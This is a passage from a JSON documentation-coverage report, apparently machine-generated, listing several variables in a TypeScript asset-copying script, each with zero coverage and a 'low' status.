                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "writeFile",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "out",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "root",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "scss",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "src",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            }
        ]
    }
}